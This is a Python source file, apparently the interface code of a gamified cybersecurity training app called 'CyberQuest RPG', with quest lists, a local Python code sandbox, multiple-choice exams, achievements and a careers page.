    # ─────────────────────────────────────────────────────────────────────

    def _avail(self, tree_filter=None):
        """Return quests the player can currently access."""
        available = []
        done      = self.save.get("completed_quests", [])
        filt      = tree_filter or self.sel_tree

        for q in ALL_QUESTS:
            if filt and q["tree"] != filt:
                continue
            if q["tier"] == 1:
                available.append(q)
            elif q["tier"] == 2:
                if any(a["id"] in done and a["tree"] == q["tree"] and a["tier"] == 1
                       for a in ALL_QUESTS):
                    available.append(q)
            elif q["tier"] == 3:
                if any(a["id"] in done and a["tree"] == q["tree"] and a["tier"] == 2
                       for a in ALL_QUESTS):
                    available.append(q)
        return available

    # ─────────────────────────────────────────────────────────────────────
    # REQUIREMENTS POPUP
    # ─────────────────────────────────────────────────────────────────────

    def _show_requirements(self):
        """Modal popup shown on first launch."""
        popup = ctk.CTkToplevel(self)
        popup.title("Getting Started — CyberQuest RPG")
        popup.geometry("850x650")
        popup.configure(fg_color=C["bg"])
        popup.transient(self)
        popup.grab_set()

        ctk.CTkLabel(popup, text="📋  BEFORE YOU BEGIN",
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["warn"]).pack(pady=(14, 6))

        box = ctk.CTkTextbox(popup, fg_color=C["bg2"], text_color=C["fg"],
                             font=ctk.CTkFont("Courier New", 13),
                             border_color=C["border"], border_width=1,
                             wrap="word")
        box.pack(fill="both", expand=True, padx=16, pady=4)
        box.insert("1.0", REQUIREMENTS_TEXT)
        box.configure(state="disabled")

        def dismiss():
            self.save["seen_requirements"] = True
            write_save(self.save)
            popup.destroy()

        ctk.CTkButton(popup, text="✓  GOT IT — LET'S HACK", command=dismiss,
                      fg_color=C["acc3"], hover_color=C["acc2"],
                      text_color=C["acc"], font=ctk.CTkFont("Courier New", 15, "bold"),
                      border_width=1, border_color=C["acc"], corner_radius=4,
                      height=46).pack(fill="x", padx=16, pady=12)

    # ─────────────────────────────────────────────────────────────────────
    # DASHBOARD (main quest list)
    # ─────────────────────────────────────────────────────────────────────

    def show_dashboard(self):
        self._clear()
        self._set_tab(0)

        # ── Tree filter row ──────────────────────────────────────────────
        filter_row = ctk.CTkFrame(self.scroll, fg_color=C["bg"])
        filter_row.pack(fill="x", pady=(0, 4))

        def set_filt(key):
            self.sel_tree = key
            self.show_dashboard()

        ctk.CTkButton(filter_row, text="ALL", width=48,
                      fg_color=C["acc3"] if not self.sel_tree else C["bg3"],
                      hover_color=C["acc3"], text_color=C["acc"] if not self.sel_tree else C["dim"],
                      font=ctk.CTkFont("Courier New", 12, "bold"),
                      border_width=1, border_color=C["border"], corner_radius=3,
                      command=lambda: set_filt(None)).pack(side="left", padx=(0, 2))

        for key, tree in SKILL_TREES.items():
            if key == "python":
                continue
            sel = self.sel_tree == key
            ctk.CTkButton(filter_row, text=tree["icon"], width=36,
                          fg_color=C["acc3"] if sel else C["bg3"],
                          hover_color=C["acc3"],
                          text_color=tree["color"] if sel else C["dim"],
                          border_width=1, border_color=C["border"], corner_radius=3,
                          command=lambda k=key: set_filt(k)).pack(side="left", padx=1)

        # ── Per-tree XP progress mini-bars ───────────────────────────────
        prog_grid = ctk.CTkFrame(self.scroll, fg_color=C["bg"])
        prog_grid.pack(fill="x", pady=(0, 6))
        non_py = {k: v for k, v in SKILL_TREES.items() if k != "python"}
        cols   = 5

        for i, (key, tree) in enumerate(non_py.items()):
            done_xp = sum(q["xp"] for q in ALL_QUESTS if q["id"] in self.save.get("completed_quests", []) and q["tree"] == key)
            max_xp  = sum(q["xp"] for q in ALL_QUESTS if q["tree"] == key)
            cell    = ctk.CTkFrame(prog_grid, fg_color=C["bg2"],
                                   border_color=C["border"], border_width=1, corner_radius=3)
            cell.grid(row=i // cols, column=i % cols, sticky="ew", padx=1, pady=1)
            ctk.CTkLabel(cell, text=f"{tree['icon']} {tree['name'].split()[0]}",
                         font=ctk.CTkFont("Courier New", 12), text_color=tree["color"]).pack(anchor="w", padx=6, pady=(3, 0))
            bar = ctk.CTkProgressBar(cell, progress_color=tree["color"],
                                     fg_color=C["bg3"], height=4)
            bar.pack(fill="x", padx=6, pady=(1, 3))
            bar.set(min(done_xp / max(1, max_xp), 1.0))

        for col in range(cols):
            prog_grid.columnconfigure(col, weight=1)

        # ── Quest cards ──────────────────────────────────────────────────
        quests = [q for q in self._avail() if q["tree"] != "python"]
        for q in quests:
            self._quest_card(q)

        if not quests:
            ctk.CTkLabel(self.scroll,
                         text="No quests available. Complete Tier 1 quests to unlock higher tiers.",
                         font=ctk.CTkFont("Courier New", 13), text_color=C["dim"]).pack(pady=20)

        # Spacer + reset button
        ctk.CTkButton(self.scroll, text="🔄  RESET ALL PROGRESS",
                      fg_color=C["bg2"], hover_color="#2a0808",
                      text_color=C["danger"], border_width=1, border_color=C["danger"],
                      font=ctk.CTkFont("Courier New", 12), corner_radius=3,
                      command=self._reset).pack(fill="x", pady=(10, 0))

    # ─────────────────────────────────────────────────────────────────────
    # PYTHON TAB
    # ─────────────────────────────────────────────────────────────────────

    def show_python(self):
        self._clear()
        self._set_tab(1)

        ctk.CTkLabel(self.scroll, text="🐍  PYTHON SCRIPTING — Hacker Track",
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["blue"]).pack(anchor="w", pady=(0, 2))
        ctk.CTkLabel(self.scroll, text="Learn Python the hacker way. Each quest has a built-in sandbox.",
                     font=ctk.CTkFont("Courier New", 13), text_color=C["dim"]).pack(anchor="w", pady=(0, 8))

        py_xp  = sum(q["xp"] for q in ALL_QUESTS if q["id"] in self.save.get("completed_quests", []) and q["tree"] == "python")
        max_xp = sum(q["xp"] for q in ALL_QUESTS if q["tree"] == "python")

        prog_box = ctk.CTkFrame(self.scroll, fg_color=C["bg2"],
                                border_color=C["blue"], border_width=1, corner_radius=4)
        prog_box.pack(fill="x", pady=(0, 10))
        ctk.CTkLabel(prog_box, text=f"Python Progress: {py_xp} / {max_xp} XP",
                     font=ctk.CTkFont("Courier New", 13, "bold"),
                     text_color=C["blue"]).pack(anchor="w", padx=10, pady=(6, 2))
        bar = ctk.CTkProgressBar(prog_box, progress_color=C["blue"], fg_color=C["bg3"], height=6)
        bar.pack(fill="x", padx=10, pady=(0, 8))
        bar.set(min(py_xp / max(1, max_xp), 1.0))

        for q in self._avail(tree_filter="python"):
            self._quest_card(q)

    # ─────────────────────────────────────────────────────────────────────
    # QUEST CARD WIDGET
    # ─────────────────────────────────────────────────────────────────────

    def _quest_card(self, quest):
        """Render a clickable quest summary card."""
        tree      = SKILL_TREES[quest["tree"]]
        done      = quest["id"] in self.save.get("completed_quests", [])
        bonus_done = quest["id"] in self.save.get("bonus_completed", [])

        bg_color  = C["done_bg"] if done else C["bg2"]
        brd_color = C["done_brd"] if done else C["border"]

        card = ctk.CTkFrame(self.scroll, fg_color=bg_color,
                            border_color=brd_color, border_width=1, corner_radius=4)
        card.pack(fill="x", pady=2)

        # Make all inner frames clickable too
        def open_quest(event=None):
            self._show_quest_detail(quest)

        inner = ctk.CTkFrame(card, fg_color=bg_color)
        inner.pack(fill="x", padx=10, pady=6)

        # Top row: icon+tier | title | XP
        top = ctk.CTkFrame(inner, fg_color=bg_color)
        top.pack(fill="x")

        ctk.CTkLabel(top, text=f"{tree['icon']} T{quest['tier']}",
                     font=ctk.CTkFont("Courier New", 12),
                     text_color=tree["color"]).pack(side="left")

        check = " ✓ " if done else "  "
        title_color = C["acc"] if done else C["white"]
        ctk.CTkLabel(top, text=f"{check}{quest['title']}",
                     font=ctk.CTkFont("Courier New", 14, "bold"),
                     text_color=title_color).pack(side="left", padx=4)

        xp_txt = f"+{quest['xp']}"
        if quest.get("bonus_xp"):
            xp_txt += f" (+{quest['bonus_xp']}★)" if not bonus_done else f" +{quest['bonus_xp']}★"
        ctk.CTkLabel(top, text=xp_txt,
                     font=ctk.CTkFont("Courier New", 13, "bold"),
                     text_color=tree["color"]).pack(side="right")

        # Brief description
        ctk.CTkLabel(inner, text=quest["brief"],
                     font=ctk.CTkFont("Courier New", 12),
                     text_color=C["dim"], anchor="w").pack(fill="x", pady=(1, 0))

        # Bind click to the card and all its children
        for widget in [card, inner, top] + list(inner.winfo_children()) + list(top.winfo_children()):
            widget.bind("<Button-1>", open_quest)
            widget.configure(cursor="hand2")

    # ─────────────────────────────────────────────────────────────────────
    # QUEST DETAIL VIEW
    # ─────────────────────────────────────────────────────────────────────

    def _show_quest_detail(self, quest):
        """Full quest view: mission text, controls, bonus section."""
        self._clear()
        self._set_tab(1 if quest["tree"] == "python" else 0)

        tree       = SKILL_TREES[quest["tree"]]
        done       = quest["id"] in self.save.get("completed_quests", [])
        bonus_done = quest["id"] in self.save.get("bonus_completed", [])
        back_cmd   = self.show_python if quest["tree"] == "python" else self.show_dashboard

        # Back button
        ctk.CTkButton(self.scroll, text="← Back", command=back_cmd, width=100,
                      fg_color=C["bg3"], hover_color=C["acc3"],
                      text_color=C["acc"], border_width=1, border_color=C["border"],
                      font=ctk.CTkFont("Courier New", 13, "bold"), corner_radius=3,
                      ).pack(anchor="w", pady=(0, 6))

        # Header card
        header = ctk.CTkFrame(self.scroll, fg_color=C["bg2"],
                              border_color=tree["color"], border_width=1, corner_radius=4)
        header.pack(fill="x")
        hinner = ctk.CTkFrame(header, fg_color=C["bg2"])
        hinner.pack(fill="x", padx=12, pady=8)

        htop = ctk.CTkFrame(hinner, fg_color=C["bg2"])
        htop.pack(fill="x")
        ctk.CTkLabel(htop, text=f"{tree['icon']}  {tree['name'].upper()}  •  TIER {quest['tier']}",
                     font=ctk.CTkFont("Courier New", 12), text_color=tree["color"]).pack(side="left")
        ctk.CTkLabel(htop, text=f"+{quest['xp']} XP",
                     font=ctk.CTkFont("Courier New", 14, "bold"),
                     text_color=tree["color"]).pack(side="right")
        ctk.CTkLabel(hinner, text=quest["title"],
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["white"]).pack(anchor="w", pady=(2, 0))

        # Mission text
        mission_box = ctk.CTkTextbox(
            self.scroll, fg_color=C["bg3"], text_color=C["fg"],
            font=ctk.CTkFont("Courier New", 13),
            border_color=C["border"], border_width=1, corner_radius=4,
            wrap="word", height=440,
        )
        mission_box.pack(fill="x", pady=(6, 0))
        mission_box.insert("1.0", quest["mission"])
        mission_box.configure(state="disabled")

        # Action buttons row
        btn_row = ctk.CTkFrame(self.scroll, fg_color=C["bg"])
        btn_row.pack(fill="x", pady=(6, 0))

        # Python sandbox button (only for python quests with sandbox code)
        if quest.get("sandbox"):
            ctk.CTkButton(btn_row, text="⚡  OPEN SANDBOX",
                          command=lambda: self._open_sandbox(quest["sandbox"]),
                          fg_color=C["bg3"], hover_color=C["acc3"],
                          text_color=C["blue"], border_width=1, border_color=C["blue"],
                          font=ctk.CTkFont("Courier New", 13, "bold"), corner_radius=3,
                          height=48).pack(side="left", padx=(0, 4), fill="x", expand=True)

        # Reset quest button (always shown)
        def reset_quest():
            if messagebox.askyesno("Reset Quest", f"Reset '{quest['title']}'?\nYou can redo it for the same XP."):
                comp = self.save.get("completed_quests", [])
                if quest["id"] in comp:
                    comp.remove(quest["id"])
                bonus = self.save.get("bonus_completed", [])
                if quest["id"] in bonus:
                    bonus.remove(quest["id"])
                self.save["completed_quests"] = comp
                self.save["bonus_completed"]   = bonus
                write_save(self.save)
                self._refresh_rank()
                self._show_quest_detail(quest)

        ctk.CTkButton(btn_row, text="↺  RESET QUEST", command=reset_quest, width=140,
                      fg_color=C["bg3"], hover_color="#2a1a00",
                      text_color=C["warn"], border_width=1, border_color=C["warn"],
                      font=ctk.CTkFont("Courier New", 13, "bold"), corner_radius=3,
                      height=48).pack(side="right")

        # Complete / completed indicator
        if not done:
            ctk.CTkButton(self.scroll, text="✓  MARK AS COMPLETE",
                          command=lambda: self._complete_quest(quest),
                          fg_color=C["acc3"], hover_color=C["acc2"],
                          text_color=C["acc"], border_width=1, border_color=C["acc"],
                          font=ctk.CTkFont("Courier New", 15, "bold"), corner_radius=4,
                          height=48).pack(fill="x", pady=(6, 0))
        else:
            ctk.CTkLabel(self.scroll, text="✓  QUEST COMPLETE",
                         font=ctk.CTkFont("Courier New", 15, "bold"),
                         text_color=C["acc"], fg_color=C["done_bg"],
                         corner_radius=4, height=48).pack(fill="x", pady=(6, 0))

        # Bonus objective section
        if quest.get("bonus"):
            bonus_frame = ctk.CTkFrame(self.scroll, fg_color=C["bg2"],
                                       border_color=C["warn"], border_width=1, corner_radius=4)
            bonus_frame.pack(fill="x", pady=(8, 0))
            binner = ctk.CTkFrame(bonus_frame, fg_color=C["bg2"])
            binner.pack(fill="x", padx=10, pady=8)

            ctk.CTkLabel(binner, text=f"★  OPTIONAL PATH  (+{quest.get('bonus_xp', 0)} XP)",
                         font=ctk.CTkFont("Courier New", 13, "bold"),
                         text_color=C["warn"]).pack(anchor="w")
            ctk.CTkLabel(binner, text=quest["bonus"],
                         font=ctk.CTkFont("Courier New", 12),
                         text_color=C["fg"], wraplength=880, justify="left",
                         anchor="w").pack(fill="x", pady=(4, 0))

            if done and not bonus_done:
                ctk.CTkButton(binner, text="★  CLAIM BONUS XP",
                              command=lambda: self._claim_bonus(quest),
                              fg_color=C["bg3"], hover_color="#2a2a00",
                              text_color=C["warn"], border_width=1, border_color=C["warn"],
                              font=ctk.CTkFont("Courier New", 13, "bold"), corner_radius=3,
                              height=46).pack(fill="x", pady=(6, 0))
            elif bonus_done:
                ctk.CTkLabel(binner, text="★  BONUS CLAIMED",
                             font=ctk.CTkFont("Courier New", 13, "bold"),
                             text_color=C["warn"]).pack(anchor="w", pady=(6, 0))

    # ─────────────────────────────────────────────────────────────────────
    # PYTHON SANDBOX POPUP
    # ─────────────────────────────────────────────────────────────────────

    def _open_sandbox(self, starter_code: str):
        """Pop-up code editor with Run button and output display."""
        win = ctk.CTkToplevel(self)
        win.title("⚡ Python Sandbox")
        win.geometry("860x660")
        win.configure(fg_color=C["bg"])
        win.transient(self)

        ctk.CTkLabel(win, text="⚡  PYTHON SANDBOX",
                     font=ctk.CTkFont("Courier New", 16, "bold"),
                     text_color=C["warn"]).pack(pady=(10, 4))

        # Code editor
        ctk.CTkLabel(win, text="CODE:", font=ctk.CTkFont("Courier New", 12),
                     text_color=C["dim"]).pack(anchor="w", padx=12)
        editor = ctk.CTkTextbox(win, fg_color=C["bg3"], text_color=C["acc"],
                                font=ctk.CTkFont("Courier New", 13),
                                border_color=C["warn"], border_width=1,
                                wrap="none", height=260)
        editor.pack(fill="both", padx=12, pady=(0, 4))
        editor.insert("1.0", starter_code)

        # Output display
        ctk.CTkLabel(win, text="OUTPUT:", font=ctk.CTkFont("Courier New", 12),
                     text_color=C["dim"]).pack(anchor="w", padx=12)
        output_box = ctk.CTkTextbox(win, fg_color=C["bg2"], text_color=C["fg"],
                                    font=ctk.CTkFont("Courier New", 13),
                                    border_color=C["border"], border_width=1,
                                    wrap="word", height=180, state="disabled")
        output_box.pack(fill="both", expand=True, padx=12, pady=(0, 4))

        def run_code():
            code = editor.get("1.0", "end").strip()
            if not code:
                return
            output_box.configure(state="normal")
            output_box.delete("1.0", "end")
            try:
                with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as tmp:
                    tmp.write(code)
                    tmp_path = tmp.name
                result = subprocess.run(
                    [sys.executable, tmp_path],
                    capture_output=True, text=True, timeout=10,
                    input="Captain\n80\ntcp\n",
                )
                out = result.stdout
                if result.stderr:
                    out += f"\n--- ERRORS ---\n{result.stderr}"
                output_box.insert("1.0", out or "(No output)")
            except subprocess.TimeoutExpired:
                output_box.insert("1.0", "⚠  Timed out (10 seconds)")
            except Exception as err:
                output_box.insert("1.0", f"Error: {err}")
            finally:
                try:
                    os.unlink(tmp_path)
                except Exception:
                    pass
            output_box.configure(state="disabled")

        btn_row = ctk.CTkFrame(win, fg_color=C["bg"])
        btn_row.pack(fill="x", padx=12, pady=(0, 10))
        ctk.CTkButton(btn_row, text="▶  RUN", command=run_code,
                      fg_color=C["acc3"], hover_color=C["acc2"],
                      text_color=C["acc"], border_width=1, border_color=C["acc"],
                      font=ctk.CTkFont("Courier New", 14, "bold"), corner_radius=3,
                      height=48).pack(side="left", fill="x", expand=True, padx=(0, 4))
        ctk.CTkButton(btn_row, text="CLOSE", command=win.destroy,
                      fg_color=C["bg3"], hover_color=C["bg2"],
                      text_color=C["dim"], border_width=1, border_color=C["border"],
                      font=ctk.CTkFont("Courier New", 14, "bold"), corner_radius=3,
                      height=48).pack(side="left", fill="x", expand=True)

    # ─────────────────────────────────────────────────────────────────────
    # COMPLETION ACTIONS
    # ─────────────────────────────────────────────────────────────────────

    def _complete_quest(self, quest):
        done = self.save.get("completed_quests", [])
        if quest["id"] not in done:
            done.append(quest["id"])
            self.save["completed_quests"] = done
            write_save(self.save)
            self._refresh_rank()
            self._show_quest_detail(quest)
            messagebox.showinfo("Quest Complete!",
                                f"+{quest['xp']} XP!\nRank: {get_rank(total_xp(self.save))['title']}")

    def _claim_bonus(self, quest):
        bonus = self.save.get("bonus_completed", [])
        if quest["id"] not in bonus:
            bonus.append(quest["id"])
            self.save["bonus_completed"] = bonus
            write_save(self.save)
            self._refresh_rank()
            self._show_quest_detail(quest)
            messagebox.showinfo("Bonus Claimed!", f"★ +{quest.get('bonus_xp', 0)} XP earned!")

    def _reset(self):
        if messagebox.askyesno("Reset All", "Erase ALL progress? This cannot be undone."):
            if messagebox.askyesno("Confirm", "Really? Every quest, exam, and bonus will be wiped."):
                self.save = {
                    "completed_quests":  [],
                    "bonus_completed":   [],
                    "exam_scores":       {},
                    "side_quests_done":  [],
                    "seen_requirements": True,
                    "started":           datetime.now().isoformat(),
                }
                write_save(self.save)
                self._refresh_rank()
                self.show_dashboard()
                messagebox.showinfo("Reset Complete", "Fresh start. Good luck, Ghost Recruit.")

    # ─────────────────────────────────────────────────────────────────────
    # EXAMS TAB
    # ─────────────────────────────────────────────────────────────────────

    def show_exams(self):
        self._clear()
        self._set_tab(2)

        ctk.CTkLabel(self.scroll, text="🧪  KNOWLEDGE EXAMS",
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["warn"]).pack(anchor="w", pady=(0, 2))
        ctk.CTkLabel(self.scroll, text="Score 70%+ to pass and earn XP. Retake any exam anytime.",
                     font=ctk.CTkFont("Courier New", 12), text_color=C["dim"]).pack(anchor="w", pady=(0, 10))

        exams_done = self.save.get("side_quests_done", [])
        scores     = self.save.get("exam_scores", {})

        for exam in SIDE_QUESTS:
            passed = exam["id"] in exams_done
            score  = scores.get(exam["id"])
            bg     = C["done_bg"] if passed else C["bg2"]
            brd    = C["done_brd"] if passed else C["border"]

            card = ctk.CTkFrame(self.scroll, fg_color=bg,
                                border_color=brd, border_width=1, corner_radius=4)
            card.pack(fill="x", pady=2)

            inner = ctk.CTkFrame(card, fg_color=bg)
            inner.pack(fill="x", padx=10, pady=7)

            top = ctk.CTkFrame(inner, fg_color=bg)
            top.pack(fill="x")

            title_txt = f"{'✓ ' if passed else ''}{exam['title']}"
            ctk.CTkLabel(top, text=title_txt,
                         font=ctk.CTkFont("Courier New", 14, "bold"),
                         text_color=C["acc"] if passed else C["white"]).pack(side="left")

            xp_txt = f"+{exam['xp']} XP"
            if score is not None:
                xp_txt += f"  (Best: {score}%)"
            ctk.CTkLabel(top, text=xp_txt,
                         font=ctk.CTkFont("Courier New", 13, "bold"),
                         text_color=C["warn"]).pack(side="right")

            ctk.CTkLabel(inner, text=f"{len(exam['questions'])} questions",
                         font=ctk.CTkFont("Courier New", 12),
                         text_color=C["dim"]).pack(anchor="w")

            def open_exam(event=None, ex=exam):
                self._start_exam(ex)

            for widget in [card, inner, top] + list(inner.winfo_children()) + list(top.winfo_children()):
                widget.bind("<Button-1>", open_exam)
                widget.configure(cursor="hand2")

    def _start_exam(self, exam):
        self._clear()
        self._set_tab(2)

        ctk.CTkButton(self.scroll, text="← Back", command=self.show_exams, width=100,
                      fg_color=C["bg3"], hover_color=C["acc3"],
                      text_color=C["acc"], border_width=1, border_color=C["border"],
                      font=ctk.CTkFont("Courier New", 13, "bold"), corner_radius=3,
                      ).pack(anchor="w", pady=(0, 6))

        ctk.CTkLabel(self.scroll, text=exam["title"],
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["warn"]).pack(anchor="w", pady=(0, 8))

        self.exam_vars = []

        for i, q in enumerate(exam["questions"]):
            q_frame = ctk.CTkFrame(self.scroll, fg_color=C["bg2"],
                                   border_color=C["border"], border_width=1, corner_radius=4)
            q_frame.pack(fill="x", pady=2)
            q_inner = ctk.CTkFrame(q_frame, fg_color=C["bg2"])
            q_inner.pack(fill="x", padx=10, pady=6)

            ctk.CTkLabel(q_inner, text=f"Q{i+1}: {q['q']}",
                         font=ctk.CTkFont("Courier New", 13, "bold"),
                         text_color=C["white"], wraplength=900, justify="left",
                         anchor="w").pack(fill="x", pady=(0, 4))

            import tkinter as tk
            var = tk.IntVar(value=-1)
            self.exam_vars.append(var)

            for j, opt in enumerate(q["options"]):
                ctk.CTkRadioButton(q_inner, text=opt, variable=var, value=j,
                                   font=ctk.CTkFont("Courier New", 13),
                                   text_color=C["fg"],
                                   fg_color=C["acc"], hover_color=C["acc2"],
                                   border_color=C["dim"]).pack(anchor="w", padx=8, pady=1)

        ctk.CTkButton(self.scroll, text="📝  SUBMIT EXAM",
                      command=lambda: self._submit_exam(exam),
                      fg_color=C["acc3"], hover_color=C["acc2"],
                      text_color=C["acc"], border_width=1, border_color=C["acc"],
                      font=ctk.CTkFont("Courier New", 15, "bold"), corner_radius=4,
                      height=48).pack(fill="x", pady=(8, 0))

    def _submit_exam(self, exam):
        correct = sum(1 for i, q in enumerate(exam["questions"])
                      if self.exam_vars[i].get() == q["answer"])
        score   = int((correct / len(exam["questions"])) * 100)
        passed  = score >= 70

        prev    = self.save.get("exam_scores", {}).get(exam["id"], 0)
        self.save.setdefault("exam_scores", {})[exam["id"]] = max(score, prev)

        if passed and exam["id"] not in self.save.get("side_quests_done", []):
            self.save.setdefault("side_quests_done", []).append(exam["id"])

        write_save(self.save)
        self._refresh_rank()

        if passed:
            messagebox.showinfo("Passed! 🎉",
                                f"Score: {correct}/{len(exam['questions'])} ({score}%)\n+{exam['xp']} XP!")
        else:
            messagebox.showinfo("Not Yet",
                                f"Score: {correct}/{len(exam['questions'])} ({score}%)\nNeed 70% to pass. Try again!")
        self.show_exams()

    # ─────────────────────────────────────────────────────────────────────
    # ACHIEVEMENTS TAB
    # ─────────────────────────────────────────────────────────────────────

    def show_achievements(self):
        self._clear()
        self._set_tab(3)

        achs    = get_achievements(self.save)
        earned  = sum(1 for a in achs if a["check"]())

        ctk.CTkLabel(self.scroll,
                     text=f"🏆  ACHIEVEMENTS — {earned} / {len(achs)} Earned",
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["acc"]).pack(pady=(0, 8))

        for ach in achs:
            earned_this = ach["check"]()
            bg  = C["done_bg"] if earned_this else C["bg2"]
            brd = C["done_brd"] if earned_this else C["border"]

            card = ctk.CTkFrame(self.scroll, fg_color=bg,
                                border_color=brd, border_width=1, corner_radius=4)
            card.pack(fill="x", pady=2)
            inner = ctk.CTkFrame(card, fg_color=bg)
            inner.pack(fill="x", padx=10, pady=6)
            row = ctk.CTkFrame(inner, fg_color=bg)
            row.pack(fill="x")

            ctk.CTkLabel(row, text=ach["icon"] if earned_this else "🔒",
                         font=ctk.CTkFont(size=22), fg_color=bg).pack(side="left", padx=(0, 10))

            info = ctk.CTkFrame(row, fg_color=bg)
            info.pack(side="left")
            ctk.CTkLabel(info, text=ach["name"],
                         font=ctk.CTkFont("Courier New", 13, "bold"),
                         text_color=C["acc"] if earned_this else C["dim"]).pack(anchor="w")
            ctk.CTkLabel(info, text=ach["desc"],
                         font=ctk.CTkFont("Courier New", 12),
                         text_color=C["dim"]).pack(anchor="w")

    # ─────────────────────────────────────────────────────────────────────
    # CAREERS TAB
    # ─────────────────────────────────────────────────────────────────────

    def show_careers(self):
        self._clear()
        self._set_tab(4)

        ctk.CTkLabel(self.scroll, text="💼  CYBERSECURITY CAREERS",
                     font=ctk.CTkFont("Courier New", 17, "bold"),
                     text_color=C["warn"]).pack(anchor="w", pady=(0, 2))
        ctk.CTkLabel(self.scroll, text="Where CyberQuest skills lead in the real world.",
                     font=ctk.CTkFont("Courier New", 12), text_color=C["dim"]).pack(anchor="w", pady=(0, 10))

        for career in CAREERS:
            card = ctk.CTkFrame(self.scroll, fg_color=C["bg2"],
                                border_color=C["border"], border_width=1, corner_radius=4)
            card.pack(fill="x", pady=3)
            inner = ctk.CTkFrame(card, fg_color=C["bg2"])
            inner.pack(fill="x", padx=12, pady=8)

            top = ctk.CTkFrame(inner, fg_color=C["bg2"])
            top.pack(fill="x")
            ctk.CTkLabel(top, text=career["title"],
                         font=ctk.CTkFont("Courier New", 14, "bold"),
                         text_color=C["white"]).pack(side="left")
            ctk.CTkLabel(top, text=career["salary"],
                         font=ctk.CTkFont("Courier New", 14, "bold"),
                         text_color=C["acc"]).pack(side="right")

            for label, value, color in [
                ("", career["desc"], C["fg"]),
                ("Skills:  ", career["skills"], C["dim"]),
                ("Certs:   ", career["certs"], C["warn"]),
                ("Trees:   ", " ".join(SKILL_TREES[t]["icon"] for t in career.get("trees", []) if t in SKILL_TREES), C["dim"]),
            ]:
                ctk.CTkLabel(inner, text=f"{label}{value}",
                             font=ctk.CTkFont("Courier New", 12),
                             text_color=color, wraplength=960,
                             justify="left", anchor="w").pack(fill="x", pady=(3, 0))
# ═══════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════

def main():
    app = App()
    app.mainloop()

if __name__ == '__main__':
    main()

